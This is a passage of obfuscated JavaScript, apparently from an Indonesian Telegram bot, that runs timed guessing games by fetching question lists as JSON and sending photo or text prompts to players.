fetch(_0x1ce978[_0x240d04(0x15b1)])[_0x240d04(0xefe)](_0x395771=>_0x395771['json']()),_0x34fcdf=_0x1095bb[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1973)](Math[_0x240d04(0x24f1)](),_0x1095bb[_0x240d04(0x2b45)]))],_0x4762d2=_0x34fcdf[_0x240d04(0x8f0)]['toLowerCas'+'e']();activeGame[_0xb65b97]={'answer':_0x4762d2,'startedAt':Date['now'](),'type':_0x1ce978['JIgCi'],'hintUsed':![]},await _0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x34fcdf[_0x240d04(0xd15)]},{'caption':'Tebak\x20nega'+'ra\x20dari\x20be'+_0x240d04(0x2270)+'\x0aGunakan\x20*'+_0x240d04(0x1eaf)+_0x240d04(0xef1)+_0x240d04(0x766)+'en*\x20untuk\x20'+_0x240d04(0x2daf)+_0x240d04(0xd33)+'\x2060\x20detik!','parse_mode':_0x240d04(0x21a9)}),_0x1ce978[_0x240d04(0x621)](setTimeout,()=>{const _0x16bc5f=_0x240d04;activeGame[_0xb65b97]&&_0x1ce978[_0x16bc5f(0x1097)](_0x1ce978['Hewdi'](Date[_0x16bc5f(0x104e)](),activeGame[_0xb65b97]['startedAt']),0xea60)&&(_0x1ce978['lOCkl'](_0x476bfb,_0x16bc5f(0xb17)+_0x16bc5f(0x2a04)+_0x16bc5f(0x26d4)+_0x1ce978[_0x16bc5f(0x369)](_0x2ca95e,_0x4762d2)+'*'),delete activeGame[_0xb65b97]);},0xea60);}else return _0x1ce978[_0x240d04(0x1f3)](_0x4a262c,_0x1ce978['KdBjs']);}catch(_0x4bf85){console[_0x240d04(0x15e)](_0x4bf85),_0x476bfb(_0x1ce978[_0x240d04(0x2e63)]);}}break;case _0x1ce978[_0x240d04(0x1af5)]:{if(activeGame[_0xb65b97])return _0x476bfb(_0x240d04(0xecc)+_0x240d04(0x23ea)+_0x240d04(0x1309)+_0x240d04(0x24a2)+_0x240d04(0x2163)+'ntuk\x20menye'+_0x240d04(0x13eb));try{if('qoZok'!==_0x1ce978[_0x240d04(0x15dd)]){const _0x4d4af1=await _0x182219(),_0x40bd71=_0x4d4af1[_0xb65b97]=_0x4d4af1[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x40bd71||!_0x40bd71[_0x240d04(0x2eea)]||!_0x40bd71[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x21e6)](_0x1ce978[_0x240d04(0x2db)],_0x1ce978[_0x240d04(0x2053)])?_0x1ce978[_0x240d04(0x1f20)](_0x476bfb,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+'an\x20/daftar'+_0x240d04(0x2cfd)+_0x240d04(0x163d)+_0x240d04(0x2d8a)):_0x1ce978[_0x240d04(0x64a)](_0x3861ff,_0x1ce978['KdBjs']);if(_0x40bd71[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x118)](_0x1ce978['pgxyP'],_0x1ce978[_0x240d04(0x2b1e)])?_0x1ce978['OyEPN'](_0x476bfb,_0x1ce978[_0x240d04(0x1453)]):_0x1ce978[_0x240d04(0x128c)](_0x3166e7,_0x1ce978[_0x240d04(0x257a)]);const _0x210301=await _0x1ce978[_0x240d04(0x1b1f)](fetch,_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x28ae)+'ne/Game/re'+'fs/heads/m'+'ain/tebaka'+_0x240d04(0x65e))[_0x240d04(0xefe)](_0x319aea=>_0x319aea['json']()),_0x5f272d=_0x210301[Math[_0x240d04(0xf02)](_0x1ce978['hAJav'](Math[_0x240d04(0x24f1)](),_0x210301[_0x240d04(0x2b45)]))],_0x30ffbb=_0x5f272d['jawaban'][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x30ffbb,'startedAt':Date['now'](),'type':'tebakanime','hintUsed':![]},await _0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x5f272d[_0x240d04(0xd15)]},{'caption':_0x1ce978[_0x240d04(0x1f25)],'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),_0x1ce978[_0x240d04(0x1430)](setTimeout,()=>{const _0x3a4690=_0x240d04;_0x1ce978[_0x3a4690(0xcd4)](_0x1ce978[_0x3a4690(0xdfc)],_0x3a4690(0x1f57))?activeGame[_0xb65b97]&&_0x1ce978[_0x3a4690(0x1dbf)](_0x1ce978['WTnSI'](Date[_0x3a4690(0x104e)](),activeGame[_0xb65b97][_0x3a4690(0x1e3f)]),0xea60)&&(_0x1ce978[_0x3a4690(0xb9d)](_0x476bfb,_0x3a4690(0xb17)+_0x3a4690(0x2a04)+_0x3a4690(0x26d4)+_0x1ce978[_0x3a4690(0x15d8)](_0x2ca95e,_0x30ffbb)+'*'),delete activeGame[_0xb65b97]):_0x4a913f[_0x56f1f9]=_0x1ce978[_0x3a4690(0x1808)](_0x4ceed6[_0x48194a]||0x0,_0xb8b336[_0x374a7f]);},0xea60);}else _0x1ce978[_0x240d04(0x25c7)](_0x208588,_0x240d04(0x172)+_0x240d04(0x1c69)+'\x20berada\x20di'+_0x240d04(0x1be8)+_0x5d72f1['number']),delete _0x79ef96[_0x31c9da];}catch(_0x10b385){console[_0x240d04(0x15e)](_0x10b385),_0x1ce978[_0x240d04(0x17e5)](_0x476bfb,_0x1ce978[_0x240d04(0x2e63)]);}}break;case _0x1ce978['GaxYp']:{if(activeGame[_0xb65b97])return _0x1ce978['yrUQp'](_0x1ce978[_0x240d04(0xd22)],_0x240d04(0x2ea0))?_0x1ce978[_0x240d04(0x15a8)](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]):(_0x54e2e2[_0x10507f]['blockedUnt'+'il']=_0x1ce978['PWYYU'](_0x4a6bfe,0x5265c00),_0x1ce978[_0x240d04(0x285d)](_0x4cd026),_0x1ce978['ylEKY'](_0x17a252,_0x240d04(0x2756)+'lalu\x20serin'+_0x240d04(0xe7e)+_0x240d04(0x13fa)+_0x240d04(0x6ba)+'r\x20selama\x201'+_0x240d04(0x11ba)));try{const _0x5e7e35=await _0x1ce978[_0x240d04(0x7a9)](_0x182219),_0x327936=_0x5e7e35[_0xb65b97]=_0x5e7e35[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x327936||!_0x327936[_0x240d04(0x2eea)]||!_0x327936[_0x240d04(0x634)])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);if(_0x327936[_0x240d04(0x2344)])return _0x476bfb(_0x1ce978['sQGDl']);const _0x4b0734=await _0x1ce978[_0x240d04(0x1010)](fetch,_0x1ce978[_0x240d04(0x1bff)])[_0x240d04(0xefe)](_0x3b1a8c=>_0x3b1a8c[_0x240d04(0x1314)]()),_0x1d696f=_0x4b0734[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0xf6d)](Math[_0x240d04(0x24f1)](),_0x4b0734[_0x240d04(0x2b45)]))],_0x4872b2=_0x1d696f['jawaban'][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x4872b2,'startedAt':Date['now'](),'type':_0x1ce978['GaxYp'],'hintUsed':![]},await _0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x1d696f[_0x240d04(0xd15)]},{'caption':_0x1ce978[_0x240d04(0x1bbb)],'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),_0x1ce978[_0x240d04(0x1830)](setTimeout,()=>{const _0x287ddd=_0x240d04;if(_0x1ce978[_0x287ddd(0x2c7d)](_0x287ddd(0xa80),'jEqnX'))activeGame[_0xb65b97]&&_0x1ce978[_0x287ddd(0xe24)](Date[_0x287ddd(0x104e)](),activeGame[_0xb65b97][_0x287ddd(0x1e3f)])>=0xea60&&(_0x1ce978[_0x287ddd(0xc97)](_0x476bfb,_0x287ddd(0xb17)+_0x287ddd(0x2a04)+_0x287ddd(0x26d4)+_0x1ce978[_0x287ddd(0xc5d)](_0x2ca95e,_0x4872b2)+'*'),delete activeGame[_0xb65b97]);else return _0x2abb35(_0x1ce978[_0x287ddd(0x257a)]);},0xea60);}catch(_0x4ded97){console[_0x240d04(0x15e)](_0x4ded97),_0x1ce978[_0x240d04(0x1e4b)](_0x476bfb,_0x240d04(0x2720)+_0x240d04(0x1934)+'.');}}break;case _0x1ce978[_0x240d04(0x2908)]:{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0x26e8)](_0x1ce978[_0x240d04(0x2d9c)],_0x1ce978[_0x240d04(0x29b7)])?_0x1ce978[_0x240d04(0x22e0)](_0xd123fe,_0x1ce978[_0x240d04(0x257a)]):_0x1ce978['Etnnc'](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]);try{const _0x4476c4=await _0x1ce978[_0x240d04(0x1319)](_0x182219),_0x18e298=_0x4476c4[_0xb65b97]=_0x4476c4[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x18e298||!_0x18e298[_0x240d04(0x2eea)]||!_0x18e298[_0x240d04(0x634)])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);if(_0x18e298[_0x240d04(0x2344)])return _0x1ce978['DcnUx'](_0x476bfb,_0x1ce978[_0x240d04(0x1453)]);const _0x4812ce=await fetch(_0x1ce978[_0x240d04(0x2477)])[_0x240d04(0xefe)](_0x30e801=>_0x30e801[_0x240d04(0x1314)]()),_0x5df533=_0x4812ce[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x186e)](Math['random'](),_0x4812ce[_0x240d04(0x2b45)]))],_0x12f0bd=_0x5df533[_0x240d04(0x13cb)]['toLowerCas'+'e']();activeGame[_0xb65b97]={'answer':_0x12f0bd,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x240d04(0x2b2f)+'l','hintUsed':![]},await _0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x5df533['img']},{'caption':_0x1ce978['DrxFq'],'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),_0x1ce978['StmMI'](setTimeout,()=>{const _0x170e57=_0x240d04,_0x40db42={'pvJRC':_0x1ce978['wwBUQ'],'nnBke':function(_0x2852c0,_0x3cb8bc){const _0x46cc3d=a0_0x1014;return _0x1ce978[_0x46cc3d(0x2d65)](_0x2852c0,_0x3cb8bc);}};if(_0x170e57(0x124a)!==_0x1ce978['EoOWj'])activeGame[_0xb65b97]&&_0x1ce978[_0x170e57(0x8ef)](_0x1ce978[_0x170e57(0x206a)](Date['now'](),activeGame[_0xb65b97]['startedAt']),0x7530)&&(_0x1ce978['YncQs'](_0x1ce978[_0x170e57(0x84e)],_0x170e57(0x35f))?(_0x1ce978[_0x170e57(0x25d6)](_0x476bfb,'⏱️\x20Waktu\x20ha'+_0x170e57(0x2a04)+_0x170e57(0x26d4)+_0x2ca95e(_0x12f0bd)+'*'),delete activeGame[_0xb65b97]):_0x3d7d60(_0x20f6aa,_0x2c14f1['length'],_0x40db42[_0x170e57(0x5e0)]));else return _0x40db42[_0x170e57(0x1cb1)](_0x48e1c0,_0x170e57(0x14f0)+'ang\x20dipenj'+'ara!\x0aGunak'+_0x170e57(0xd01)+'\x20untuk\x20mem'+_0x170e57(0x156f)+_0x170e57(0x254)+'ar.');},0x7530);}catch(_0x4811af){_0x1ce978[_0x240d04(0x2058)](_0x1ce978[_0x240d04(0x12db)],_0x1ce978['lGUow'])?(console[_0x240d04(0x15e)](_0x4811af),_0x1ce978[_0x240d04(0xa99)](_0x476bfb,_0x1ce978['vchiT'])):_0x12ba5d[_0x350fd1]+=_0x213aef[_0x526a2f];}}break;case _0x1ce978[_0x240d04(0x1a13)]:{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0xa7d)](_0x1ce978[_0x240d04(0xe92)],_0x1ce978[_0x240d04(0xe92)])?_0x1ce978[_0x240d04(0x255f)](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]):_0x1ce978[_0x240d04(0x3ff)](_0x3da40b,_0x1ce978['iOIVV']);try{if(_0x1ce978[_0x240d04(0x1630)](_0x1ce978['QJmtf'],_0x1ce978[_0x240d04(0x845)])){const _0x403839=await _0x182219(),_0x354339=_0x403839[_0xb65b97]=_0x403839[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x354339||!_0x354339[_0x240d04(0x2eea)]||!_0x354339[_0x240d04(0x634)])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);if(_0x354339[_0x240d04(0x2344)]){if(_0x1ce978[_0x240d04(0x1bd)]('eHcUE',_0x1ce978['SKbkR']))_0x2bbaea=_0x5d69aa['video'],_0x4605d3=_0x5abf88[_0x240d04(0x2321)]||_0x240d04(0x4f4),_0x2afec9=_0x3b5cf7['mime_type']||_0x1ce978[_0x240d04(0x255b)];else return _0x1ce978['yQSWI'](_0x476bfb,_0x1ce978[_0x240d04(0x1453)]);}const _0x1e9d2c=await fetch(_0x1ce978[_0x240d04(0x2ccf)])[_0x240d04(0xefe)](_0x5d3a96=>_0x5d3a96[_0x240d04(0x1314)]()),_0x10cee2=_0x1e9d2c[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1571)](Math[_0x240d04(0x24f1)](),_0x1e9d2c['length']))],_0x236d7e=_0x10cee2[_0x240d04(0x13cb)][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x236d7e,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978[_0x240d04(0x1a13)],'hintUsed':![]},await _0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x10cee2[_0x240d04(0xd15)]},{'caption':_0x1ce978['XyJvZ'],'parse_mode':_0x1ce978['AWHzb']}),_0x1ce978[_0x240d04(0xe19)](setTimeout,()=>{const _0x2a3d9a=_0x240d04,_0x3a2fc9={'TyHzC':function(_0x1f8e91,_0x4f0763){return _0x1ce978['LseGT'](_0x1f8e91,_0x4f0763);}};if(activeGame[_0xb65b97]&&_0x1ce978[_0x2a3d9a(0xd19)](Date[_0x2a3d9a(0x104e)](),activeGame[_0xb65b97][_0x2a3d9a(0x1e3f)])>=0xea60){if(_0x1ce978[_0x2a3d9a(0xa20)](_0x1ce978[_0x2a3d9a(0x2aab)],_0x1ce978[_0x2a3d9a(0x4ea)]))_0x1ce978[_0x2a3d9a(0x2b13)](_0x476bfb,'⏱️\x20Waktu\x20ha'+'bis!\x20Jawab'+'an:\x20*'+_0x1ce978[_0x2a3d9a(0x2590)](_0x2ca95e,_0x236d7e)+'*'),delete activeGame[_0xb65b97];else return _0x3a2fc9[_0x2a3d9a(0x1499)](_0x3620e0,_0x2a3d9a(0x25e4)+_0x2a3d9a(0x1eea)+_0x3a2fc9[_0x2a3d9a(0x1499)](_0x55ede7,_0x38fed9)+(_0x2a3d9a(0x1c1a)+_0x2a3d9a(0x88d)+_0x2a3d9a(0x24cf)));}},0xea60);}else return _0x1ce978[_0x240d04(0x2968)](_0x207560['charAt'](0x0)['toUpperCas'+'e'](),_0x26f672[_0x240d04(0x728)](0x1));}catch(_0x4e3358){_0x1ce978[_0x240d04(0x2b6e)](_0x240d04(0x486),_0x1ce978[_0x240d04(0x2e7d)])?(console[_0x240d04(0x15e)](_0x4e3358),_0x1ce978[_0x240d04(0x1dc6)](_0x476bfb,_0x1ce978['vchiT'])):_0x1ce978[_0x240d04(0xe0)](_0x139cdc,_0x68a2b4,_0x2606c3[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x186b)]);}}break;case _0x1ce978[_0x240d04(0x9f5)]:{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0x1cf3)](_0x476bfb,_0x1ce978['iOIVV']);try{const _0x31e83f=await _0x1ce978[_0x240d04(0x2a00)](_0x182219),_0x53aa5d=_0x31e83f[_0xb65b97]=_0x31e83f[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x53aa5d||!_0x53aa5d[_0x240d04(0x2eea)]||!_0x53aa5d[_0x240d04(0x634)])return _0x1ce978['ypbzP'](_0x476bfb,_0x1ce978['KdBjs']);if(_0x53aa5d[_0x240d04(0x2344)]){if(_0x1ce978['UbXcm'](_0x1ce978['sZiCB'],_0x1ce978['sZiCB']))return _0x1ce978['rUguy'](_0x476bfb,_0x1ce978[_0x240d04(0x1453)]);else{var _0x31c5e4=_0x57aab3[_0x240d04(0xf02)](_0x543af9/0x3e8%0x3c),_0x245008=_0x5f0222[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x10f8)](_0x1ce978[_0x240d04(0x4f2)](_0x5be5bf,_0x1ce978[_0x240d04(0x1571)](0x3e8,0x3c)),0x3c)),_0x11f471=_0x5d14f6[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x82d)](_0x1ce978['SIDEA'](_0x525ece,_0x1ce978['DZMfy'](0x3e8*0x3c,0x3c)),0x18));return _0x11f471[_0x240d04(0x2cb7)]()['padStart'](0x2,'0')+_0x240d04(0x2a6c)+_0x245008[_0x240d04(0x2cb7)]()[_0x240d04(0x1f96)](0x2,'0')+_0x240d04(0x2eca)+_0x31c5e4['toString']()[_0x240d04(0x1f96)](0x2,'0')+_0x240d04(0x20ee);}}const _0x147014=await _0x1ce978[_0x240d04(0x152e)](fetch,_0x1ce978[_0x240d04(0x25bb)])[_0x240d04(0xefe)](_0xd1d50b=>_0xd1d50b[_0x240d04(0x1314)]()),_0x595ff6=_0x147014[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x19cd)](Math[_0x240d04(0x24f1)](),_0x147014[_0x240d04(0x2b45)]))],_0x190eb1=_0x595ff6['jawaban']['toLowerCas'+'e']();activeGame[_0xb65b97]={'answer':_0x190eb1,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978[_0x240d04(0x1259)],'hintUsed':![]},await _0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x595ff6[_0x240d04(0xd15)]},{'caption':_0x240d04(0xb43)+_0x595ff6[_0x240d04(0xc9d)]+('\x0a\x0aGunakan\x20'+_0x240d04(0x2e68)+'a\x20kesulita'+_0x240d04(0x687)+'ren*\x20untuk'+_0x240d04(0x134)+_0x240d04(0x1768)+'a\x20120\x20deti'+'k!'),'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),_0x1ce978[_0x240d04(0x24cd)](setTimeout,()=>{const _0x4d2866=_0x240d04;activeGame[_0xb65b97]&&_0x1ce978[_0x4d2866(0x331)](Date[_0x4d2866(0x104e)](),activeGame[_0xb65b97][_0x4d2866(0x1e3f)])>=0x1d4c0&&(_0x4d2866(0x28e1)===_0x4d2866(0x1276)?_0x1ce978[_0x4d2866(0x2e64)](_0x569dad,_0x1ce978[_0x4d2866(0x273c)]):(_0x1ce978[_0x4d2866(0xb83)](_0x476bfb,_0x4d2866(0xb17)+_0x4d2866(0x2a04)+_0x4d2866(0x26d4)+_0x1ce978[_0x4d2866(0x1fcf)](_0x2ca95e,_0x190eb1)+'*'),delete activeGame[_0xb65b97]));},0x1d4c0);}catch(_0x223327){_0x1ce978[_0x240d04(0xffa)](_0x1ce978[_0x240d04(0x2659)],_0x240d04(0xe0d))?_0x39ccb8(_0x184cae,_0x319455[_0x240d04(0x2b45)],_0x240d04(0x26c2)):(console[_0x240d04(0x15e)](_0x223327),_0x1ce978[_0x240d04(0xf2f)](_0x476bfb,_0x1ce978[_0x240d04(0x2e63)]));}}break;case _0x1ce978[_0x240d04(0x249f)]:{if(_0x1ce978[_0x240d04(0x239f)](_0x1ce978[_0x240d04(0x1e66)],_0x1ce978[_0x240d04(0x1e66)]))_0x1ce978[_0x240d04(0x1ba)](_0x5ef19e,_0x3b0724,_0x381f46[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2597)]);else{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0x1a20)](_0x1ce978['pYTOh'],_0x1ce978['lUypv'])?_0x1ce978[_0x240d04(0x247e)](_0x26c753,_0x1ce978[_0x240d04(0x17c4)]):_0x1ce978[_0x240d04(0x153b)](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]);try{const _0x1318a1=await _0x1ce978[_0x240d04(0x265a)](_0x182219),_0x4c7c02=_0x1318a1[_0xb65b97]=_0x1318a1[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x4c7c02||!_0x4c7c02['nama']||!_0x4c7c02[_0x240d04(0x634)]){if(_0x1ce978['FCLZv'](_0x1ce978[_0x240d04(0x1f5e)],_0x240d04(0x1d89)))_0x3f2745[_0x240d04(0x15e)](_0x12642d),_0x1ce978['NOxbL'](_0x2bb12f,_0x240d04(0x2720)+_0x240d04(0x1934)+'.');else return _0x1ce978[_0x240d04(0x1f7)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);}if(_0x4c7c02[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x2116)](_0x1ce978[_0x240d04(0x140d)],_0x1ce978['hvEhf'])?_0x1ce978[_0x240d04(0x369)](_0x476bfb,_0x1ce978[_0x240d04(0x1453)]):_0x46d4c2('⛓️\x20Kamu\x20sed'+_0x240d04(0x2324)+_0x240d04(0x166e)+_0x240d04(0x2826)+_0x240d04(0x1fbc)+_0x240d04(0x1310)+_0x240d04(0x260)+_0x240d04(0x1c31)+_0x240d04(0x2b19)+_0x240d04(0x7af)+'keluar\x20dar'+'i\x20penjara.');const _0x527ad3=await _0x1ce978[_0x240d04(0x5c2)](fetch,_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+'com/qisyan'+_0x240d04(0x1b99)+_0x240d04(0x519)+_0x240d04(0x140c)+'json')['then'](_0x4f854b=>_0x4f854b[_0x240d04(0x1314)]()),_0x50d3e9=_0x527ad3[Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*_0x527ad3[_0x240d04(0x2b45)])],_0xa2842e=_0x50d3e9[_0x240d04(0x13cb)]['toLowerCas'+'e']();activeGame[_0xb65b97]={'answer':_0xa2842e,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978['zepyn'],'hintUsed':![]},_0x1ce978[_0x240d04(0x2881)](_0x476bfb,'*'+_0x50d3e9[_0x240d04(0x1d4)]+('*\x0a\x0aGunakan'+_0x240d04(0x28b6)+_0x240d04(0x1b69)+_0x240d04(0x296)+_0x240d04(0x115e)+_0x240d04(0x2ba6)+_0x240d04(0x19b1)+_0x240d04(0x1b25)+'k!'),{'parse_mode':_0x1ce978[_0x240d04(0xa1b)]}),_0x1ce978[_0x240d04(0x2282)](setTimeout,()=>{const _0x311bd3=_0x240d04;activeGame[_0xb65b97]&&_0x1ce978[_0x311bd3(0x1097)](Date['now']()-activeGame[_0xb65b97][_0x311bd3(0x1e3f)],0x7530)&&(_0x1ce978[_0x311bd3(0x2112)](_0x476bfb,_0x311bd3(0xb17)+_0x311bd3(0x2a04)+_0x311bd3(0x26d4)+_0x1ce978[_0x311bd3(0x1037)](_0x2ca95e,_0xa2842e)+'*'),delete activeGame[_0xb65b97]);},0x7530);}catch(_0x24ada4){console[_0x240d04(0x15e)](_0x24ada4),_0x1ce978['yXRKI'](_0x476bfb,'❌\x20Gagal\x20me'+'mulai\x20game'+'.');}}}break;case _0x1ce978[_0x240d04(0x1896)]:{if(activeGame[_0xb65b97]){if(_0x1ce978[_0x240d04(0x1db7)](_0x240d04(0x1f8f),_0x1ce978[_0x240d04(0x2029)]))return _0x1ce978['HNXpZ'](_0x476bfb,_0x240d04(0xecc)+_0x240d04(0x23ea)+'n\x20game\x20lai'+_0x240d04(0x24a2)+_0x240d04(0x2163)+_0x240d04(0x951)+_0x240d04(0x13eb));else _0x4078c8(_0x5cf8f2,_0x58013b[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]);}try{const _0x43bd0=await _0x182219(),_0x56cade=_0x43bd0[_0xb65b97]=_0x43bd0[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x56cade||!_0x56cade[_0x240d04(0x2eea)]||!_0x56cade[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0xa37)](_0x476bfb,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+_0x240d04(0x2cfd)+_0x240d04(0x163d)+_0x240d04(0x2d8a));if(_0x56cade[_0x240d04(0x2344)]){if(_0x1ce978[_0x240d04(0x2cd)](_0x1ce978[_0x240d04(0x828)],_0x1ce978[_0x240d04(0x2757)]))return _0x1ce978[_0x240d04(0x1d30)](_0x476bfb,_0x1ce978[_0x240d04(0x1453)]);else _0x1baa74[_0x240d04(0x15e)](_0x28f904),_0x1ce978[_0x240d04(0x257e)](_0x292631,_0x1ce978[_0x240d04(0x1be3)]);}const _0x531a0f=await _0x1ce978[_0x240d04(0x11df)](fetch,_0x1ce978[_0x240d04(0x5fd)])['then'](_0xaee6c8=>_0xaee6c8['json']()),_0x2e6412=_0x531a0f[Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0xf6d)](Math['random'](),_0x531a0f[_0x240d04(0x2b45)]))],_0x44dae6=_0x2e6412['jawaban'][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x44dae6,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978[_0x240d04(0x1896)],'hintUsed':![]},_0x1ce978[_0x240d04(0x1477)](_0x476bfb,_0x240d04(0x370)+_0x240d04(0x25eb)+_0x2e6412[_0x240d04(0x2461)]+(_0x240d04(0x11aa)+_0x240d04(0x28b6)+'ka\x20kesulit'+_0x240d04(0x296)+_0x240d04(0x115e)+_0x240d04(0x2ba6)+_0x240d04(0x19b1)+'ya\x2030\x20deti'+'k!'),{'parse_mode':_0x1ce978['AWHzb']}),_0x1ce978['zCnsG'](setTimeout,()=>{const _0x47dd00=_0x240d04;activeGame[_0xb65b97]&&Date[_0x47dd00(0x104e)]()-activeGame[_0xb65b97][_0x47dd00(0x1e3f)]>=0x7530&&(_0x1ce978[_0x47dd00(0x27c5)](_0x476bfb,_0x47dd00(0xb17)+'bis!\x20Jawab'+_0x47dd00(0x26d4)+_0x1ce978[_0x47dd00(0x1a89)](_0x2ca95e,_0x44dae6)+'*'),delete activeGame[_0xb65b97]);},0x7530);}catch(_0x222de1){console[_0x240d04(0x15e)](_0x222de1),_0x476bfb(_0x240d04(0x2720)+_0x240d04(0x1934)+'.');}}break;case _0x1ce978[_0x240d04(0x227b)]:{if(_0x1ce978['vWVrz'](_0x1ce978[_0x240d04(0x1b10)],_0x240d04(0x836)))try{_0x15e564[_0x240d04(0x22b5)+_0x240d04(0xfd5)](_0xb17a66,_0x46fbfb[_0x240d04(0x1cf5)](_0x5c16b1,null,0x2),_0x1ce978[_0x240d04(0x8b9)]),_0x4eaa53['log'](_0x1ce978[_0x240d04(0x1eee)]);}catch(_0x1a4bc8){_0x1cd23d[_0x240d04(0x15e)](_0x240d04(0x29e3)+'an\x20databas'+_0x240d04(0x5d2),_0x1a4bc8);}else{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0xe98)](_0x1ce978['wmNDk'],_0x1ce978[_0x240d04(0x13dc)])?_0x1ce978['lxWVT'](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]):(_0x4811b0[_0x11acdd]=!![],_0x1ce978[_0x240d04(0x285d)](_0x595810),_0x1ce978[_0x240d04(0x116b)](_0x44dfe8,_0x1ce978[_0x240d04(0x1ef5)]));try{const _0x5bf926=await _0x1ce978[_0x240d04(0x233f)](_0x182219),_0x95f0d3=_0x5bf926[_0xb65b97]=_0x5bf926[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x95f0d3||!_0x95f0d3[_0x240d04(0x2eea)]||!_0x95f0d3[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x13b6)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x95f0d3['jail'])return _0x1ce978[_0x240d04(0x199d)](_0x476bfb,_0x1ce978[_0x240d04(0x1453)]);const _0xffff92=await fetch(_0x1ce978['Cfqqr'])[_0x240d04(0xefe)](_0x14b9cb=>_0x14b9cb[_0x240d04(0x1314)]()),_0x3a113c=_0xffff92[Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*_0xffff92[_0x240d04(0x2b45)])],_0x350d26=_0x3a113c[_0x240d04(0x13cb)][_0x240d04(0x25f7)+'e']();activeGame[_0xb65b97]={'answer':_0x350d26,'startedAt':Date[_0x240d04(0x104e)](),'type':_0x1ce978[_0x240d04(0x227b)],'hintUsed':![]},_0x476bfb(_0x240d04(0x29dc)+_0x3a113c[_0x240d04(0x2461)]+_0x240d04(0x10ea)+_0x3a113c[_0x240d04(0xd0f)]+(_0x240d04(0x2671)+_0x240d04(0x2e68)+'a\x20kesulita'+_0x240d04(0x687)+_0x240d04(0x23f9)+'\x20menyerah.'+'\x0aKamu\x20puny'+_0x240d04(0x1e8a)+'!'),{'parse_mode':_0x1ce978['AWHzb']}),_0x1ce978[_0x240d04(0x2594)](setTimeout,()=>{const _0x554fd3=_0x240d04;activeGame[_0xb65b97]&&_0x1ce978[_0x554fd3(0x2a22)](_0x1ce978[_0x554fd3(0xf5c)](Date[_0x554fd3(0x104e)](),activeGame[_0xb65b97][_0x554fd3(0x1e3f)]),0x7530)&&(_0x476bfb(_0x554fd3(0xb17)+_0x554fd3(0x2a04)+_0x554fd3(0x26d4)+_0x1ce978[_0x554fd3(0x257e)](_0x2ca95e,_0x350d26)+'*'),delete activeGame[_0xb65b97]);},0x7530);}catch(_0x1ce29a){console[_0x240d04(0x15e)](_0x1ce29a),_0x1ce978[_0x240d04(0xfac)](_0x476bfb,_0x1ce978[_0x240d04(0x2e63)]);}}}break;case 